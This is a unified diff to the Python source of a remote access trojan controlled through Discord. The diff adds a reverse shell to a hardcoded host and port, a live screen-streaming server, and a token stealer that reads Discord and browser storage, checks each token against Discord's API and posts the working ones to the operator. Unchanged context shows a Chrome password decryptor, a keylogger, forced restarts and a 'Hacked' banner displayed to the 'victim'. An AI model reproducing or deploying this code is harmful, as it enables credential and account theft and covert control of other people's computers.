@@ -71,19 +71,17 @@ import imutils
 import mss
 import numpy
 import time
+
+
+# for getting user in gogle chrome
 import json
 import base64
 import sqlite3
 import shutil
 from datetime import timezone, datetime, timedelta
-
-
-#3rd party modules
 import win32crypt
 from Crypto.Cipher import AES
 
-# code for stream and view
-from stream_vic import stream
 
 # Pkg for Keylogger
 import pynput
@@ -109,9 +107,9 @@ def MaxVolume():
         volume.SetMute(0, None)
     volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
 
+# functions for Google Chrom
 def my_chrome_datetime(time_in_mseconds):
     return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)
-
 def encryption_key():
 
     #C:\Users\USER_Name\AppData\Local\Google\Chrome\Local State
@@ -128,7 +126,6 @@ def encryption_key():
     ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
 
     return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key
-
 def decrypt_password(enc_password, key):
     try:
         init_vector = enc_password[3:15]
@@ -143,6 +140,49 @@ def decrypt_password(enc_password, key):
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
             return "No Passwords(logged in with Social Account)"
+
+
+
+# functions for streaming
+server_socket_stream = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+def stream():
+
+    # print(user_cmd)
+    host_name  = socket.gethostname()
+    host_ip = socket.gethostbyname(host_name)
+    print('HOST IP:',host_ip)
+    port = 9999
+    socket_address = (host_ip,port)
+
+    # Socket Bind
+    server_socket_stream.bind(socket_address)
+
+    # Socket Listen
+    server_socket_stream.listen(5)
+    print("LISTENING AT:",socket_address)
+
+    # Socket Accept
+    while True:
+        client_socket,addr = server_socket_stream.accept()
+        print('GOT CONNECTION FROM:',addr)
+        if client_socket:
+            with mss.mss() as sct:
+
+                monitor = {"top": 20, "left": 195, "width": 1520, "height": 900}
+                # vid = cv2.VideoCapture('vid.mp4')
+
+                while "Screen capturing":
+                    last_time = time.time()
+                    img = numpy.array(sct.grab(monitor))
+                    a = pickle.dumps(img)
+                    message = struct.pack("Q",len(a))+a
+                    client_socket.sendall(message)
+
+                    key = cv2.waitKey(1) & 0xFF
+                    if key  == ord('q'):
+                        break
+
+
 
 # Function when out Bot is alive
 @client.event
@@ -181,6 +221,54 @@ async def on_ready():
 
     # change this to your choice
     # time.sleep(1)
+
+
+#reverse_shell
+@client.command()
+async def reverse_shell(message):
+
+    SERVER_HOST = '192.168.100.3'
+    SERVER_PORT = 5003
+    BUFFER_SIZE = 1024 * 150
+
+    SEPARATOR = "<sep>"
+
+
+    server_socket = socket.socket()
+    # connect to the server
+    server_socket.connect((SERVER_HOST, SERVER_PORT))
+
+    # get the current directory
+    cwd = os.getcwd()
+    server_socket.send(cwd.encode())
+
+    while True:
+
+        # receive the command from the server
+        command = server_socket.recv(BUFFER_SIZE).decode()
+        splited_command = command.split()
+        if command.lower() == "exit":
+            break
+        if splited_command[0].lower() == "cd":
+            # cd command, change directory
+            try:
+                os.chdir(' '.join(splited_command[1:]))
+            except FileNotFoundError as e:
+                output = str(e)
+            else:
+                # if operation is successful, empty message
+                output = ""
+        else:
+            # execute the command and retrieve the results
+            output = subprocess.getoutput(command)
+
+        cwd = os.getcwd()
+        # send the results back to the server
+        message = f"{output}{SEPARATOR}{cwd}"
+        server_socket.send(message.encode())
+    # close client connection
+    server_socket.close()
+
 
 #Show Capable CMD
 @client.command()
@@ -233,8 +321,6 @@ async def restart_user(message, duration: str):
     time.sleep(2)
     os.system("shutdown /r /t {}".format(duration))
 
-
-# REVIEW:
 #Get passwork in google chrome
 @client.command()
 async def get_chrome_pass(message):
@@ -297,7 +383,11 @@ async def open_stream(message):
 
     await message.send("Opening server now")
     time.sleep(2)
-    stream()
+    try:
+        stream()
+    except Exception as e:
+        raise
+
     time.sleep(1)
     await message.send('server opened')
     time.sleep(2)
@@ -323,7 +413,7 @@ async def screenshot(message):
     await message.send("I got you my guy")
     time.sleep(2)
     temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
-    with mss() as sct:
+    with mss.mss() as sct:
         sct.shot(output=temp)
     file = discord.File(temp, filename="monitor.png")
     await message.send("Here's the screenshot", file=file)
@@ -412,54 +502,64 @@ async def show_keylogs(message):
      await message.send("Successfully dumped all the logs", file=file)
      os.remove(file_keys)
 
-# still unfinished
-# Steal some token mah boi
-# @client.command()
-# async def token(message):
-#     await message.send("HEHE it's grabbing token time mah boi")
-#     time.sleep(2)
-#     await message.send("gimme a sec")
-#
-#     # location of AppData in local computer
-#
-#     localappdata  = os.getenv('LOCALAPPDATA')
-#     roaming = os.getenv('APPDATA')
-#
-#     # paths to local data
-#     paths = {
-#         'Discord': os.path.join(roaming, 'Discord'),
-#
-#     }
-#
-#     for platform, path in paths.items():
-#         path = os.path.join(path, 'Local Storage', 'leveldb')
-#
-#     if os.path.exists(path) is False:
-#         return True
-#
-#     for item in os.listdir(path):
-#
-#         if not item[-2:] in ('.log', '.ldb'):
-#             continue
-#
-#         with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
-#             lines = file.readlines()
-#
-#         for line in lines:
-#             line = line.strip()
-#
-#             if len(line) == 0:
-#                 continue
-#
-#             for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
-#                 if token in tokens:
-#                     continue
-#
-#                 tokens.append(token)
-#
-#     await message.send(tokens)
-#     time.sleep(2)
-#
+# REVIEW: 
+@client.command()
+async def token(message):
+    await message.send("Grabbing discord token only")
+    time.sleep(2)
+    await message.send(f"extracting tokens. . .")
+    tokens = []
+    saved = ""
+    paths = {
+            'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': os.getenv('APPDATA') + r'\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
+    for source, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        for token in tokens:
+            r = requests.get("https://discord.com/api/v9/users/@me", headers={
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+                "Authorization": token
+            })
+            if r.status_code == 200:
+                if token in saved:
+                    continue
+                saved += f"`{token}`\n\n"
+    if saved != "":
+        await message.send(f"**Token(s) succesfully grabbed:** \n{saved}")
+    else:
+        await message.send(f"**User didn't have any stored tokens**")
+    time.sleep(2)
+
 
 # Check what app is running
 @client.command()
@@ -480,7 +580,7 @@ async def check_open_app(message):
 # Close running apps
 @client.command()
 async def close_app(message, app: str):
-    os.system(" taskkill /f /im {}".format(app))
+    os.system(" taskkill /f /im {}.exe".format(app))
     time.sleep(2)
     await message.send(f'{app} is now closed LEZGOOOO')
 
@@ -565,24 +665,58 @@ async def rest(message):
        await message.send(f'No channel named, "{victim_ip}", was found')
        exit()
 
-
-
-
 @client.command()
 async def banner(message):
     await message.send("We're gonna leave our mark")
 
-    # running the banner to victim
-    os.system('start runner.bat')
+    with open('user.txt','w') as f:
+        f.write('''
+                                                 ,-----------------------,          ,"        ,"|
+                                                ,"                      ,"|        ,"        ,"  |
+                                               +-----------------------+  |      ,"        ,"    |
+                                               |  .-----------------.  |  |     +---------+      |
+                                               |  |                 |  |  |     | -==----'|      |
+                                               |  |                 |  |  |     |         |      |
+                                               |  |     Hacked      |  |  |/----|`---=    |      |
+                                               |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
+                                               |  |                 |  |  |  // |(((( [33]|    ,"
+                                               |  `-----------------'  |," .;'| |((((     |  ,"
+                                               +-----------------------+  ;;  | |         |,"     -Jnthn/P3nut-
+                                                  /_)______________(_/  //'   | +---------+
+                                             ___________________________/___  `,
+                                            /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+                                           / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+                                          /_==__==========__==_ooo__ooo=_/'   /___________,"
+                                          `-----------------------------'
+                                          ''')
+
+
+    os.startfile('user.txt')
+    time.sleep(2)
+    os.remove('user.txt')
     time.sleep(2)
 
     # sending screenshot to our Discord server
     temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
-    with mss() as sct:
+    with mss.mss() as sct:
         sct.shot(output=temp)
     file = discord.File(temp, filename="monitor.png")
     await message.send("Here's the screenshot", file=file)
     os.remove(temp)
 
+@client.command()
+async def message_vic(message, message_sender: str):
+    await message.send('Sending message to victim')
+    print(message_sender)
+
+    if message_sender != '':
+        with open('message_user.txt','w') as f:
+            f.write(message_sender)
+            time.sleep(2)
+            os.startfile('message_user.txt')
+            time.sleep(2)
+            os.remove('message_user.txt')
+    else:
+        await message.send('Message Error')
 
 client.run(bot_token)
